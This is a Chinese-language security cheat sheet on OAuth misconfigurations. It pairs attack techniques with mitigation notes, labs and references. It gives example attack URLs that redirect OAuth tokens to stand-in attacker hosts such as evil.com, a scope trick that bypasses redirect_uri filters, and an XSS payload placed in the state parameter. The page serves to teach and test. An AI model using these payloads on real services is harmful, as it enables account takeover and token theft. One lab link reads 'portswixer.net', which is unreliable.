[原文文档](README.en.md)

# OAuth 配置错误

> OAuth是一个广泛使用的授权框架，允许第三方应用程序访问用户数据而不暴露用户凭据。然而，OAuth的不当配置和实现可能导致严重的安全漏洞。本文档探讨了常见的OAuth配置错误、潜在攻击向量以及减轻这些风险的最佳实践。

## 摘要

- [通过referer窃取OAuth令牌](#stealing-oauth-token-via-referer)
- [通过redirect_uri获取OAuth令牌](#grabbing-oauth-token-via-redirect_uri)
- [通过redirect_uri执行XSS](#executing-xss-via-redirect_uri)
- [OAuth私钥泄露](#oauth-private-key-disclosure)
- [授权代码规则违反](#authorization-code-rule-violation)
- [跨站请求伪造](#cross-site-request-forgery)
- [实验环境](#labs)
- [参考资料](#references)

## 通过referer窃取OAuth令牌

> 你有HTML注入但无法获取XSS吗？网站上是否有任何OAuth实现？如果有，在你的服务器上设置一个img标签，看看是否有办法让受害者在登录后到达那里（重定向等），通过referer窃取OAuth令牌 - [@abugzlife1](https://twitter.com/abugzlife1/status/1125663944272748544)

## 通过redirect_uri获取OAuth令牌

重定向到受控域名以获取访问令牌

```powershell
https://www.example.com/signin/authorize?[...]&redirect_uri=https://demo.example.com/loginsuccessful
https://www.example.com/signin/authorize?[...]&redirect_uri=https://localhost.evil.com
```

重定向到接受的开放URL以获取访问令牌

```powershell
https://www.example.com/oauth20_authorize.srf?[...]&redirect_uri=https://accounts.google.com/BackToAuthSubTarget?next=https://evil.com
https://www.example.com/oauth2/authorize?[...]&redirect_uri=https%3A%2F%2Fapps.facebook.com%2Fattacker%2F
```

OAuth实现永远不应将整个域名列入白名单，只能将少数URL列入白名单，这样"redirect_uri"就不能指向开放重定向。

有时你需要将scope更改为无效的以绕过对redirect_uri的过滤器：

```powershell
https://www.example.com/admin/oauth/authorize?[...]&scope=a&redirect_uri=https://evil.com
```

## 通过redirect_uri执行XSS

```powershell
https://example.com/oauth/v1/authorize?[...]&redirect_uri=data%3Atext%2Fhtml%2Ca&state=<script>alert('XSS')</script>
```

## OAuth私钥泄露

一些Android/iOS应用可以被反编译，并且可以访问OAuth私钥。

## 授权代码规则违反

> 客户端不得多次使用授权代码。

如果授权代码被多次使用，授权服务器必须拒绝请求，并应撤销（如果可能）之前基于该授权代码发布的所有令牌。

## 跨站请求伪造

在OAuth回调中不检查有效CSRF令牌的应用程序容易受到攻击。这可以通过初始化OAuth流程并拦截回调（`https://example.com/callback?code=AUTHORIZATION_CODE`）来利用。此URL可用于CSRF攻击。

> 客户端必须为其重定向URI实现CSRF保护。这通常通过要求发送到重定向URI端点的任何请求包含将请求绑定到用户代理认证状态的值来实现。客户端应在发出授权请求时使用"state"请求参数将该值传递给授权服务器。

## 实验环境

- [PortSwigger - 通过OAuth隐式流的身份验证绕过](https://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow)
- [PortSwigger - 强制OAuth配置文件链接](https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking)
- [PortSwigger - 通过redirect_uri的OAuth账户劫持](https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri)
- [PortSwigger - 通过代理页面窃取OAuth访问令牌](https://portswixer.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page)
- [PortSwigger - 通过开放重定向窃取OAuth访问令牌](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect)

## 参考资料

- [All your Paypal OAuth tokens belong to me - asanso - November 28, 2016](http://blog.intothesymmetry.com/2016/11/all-your-paypal-tokens-belong-to-me.html)
- [OAuth 2 - How I have hacked Facebook again (..and would have stolen a valid access token) - asanso - April 8, 2014](http://intothesymmetry.blogspot.ch/2014/04/oauth-2-how-i-have-hacked-facebook.html)
- [How I hacked Github again - Egor Homakov - February 7, 2014](http://homakov.blogspot.ch/2014/02/how-i-hacked-github-again.html)
- [How Microsoft is giving your data to Facebook… and everyone else - Andris Atteka - September 16, 2014](http://andrisatteka.blogspot.ch/2014/09/how-microsoft-is-giving-your-data-to.html)
- [Bypassing Google Authentication on Periscope's Administration Panel - Jack Whitton - July 20, 2015](https://whitton.io/articles/bypassing-google-authentication-on-periscopes-admin-panel/)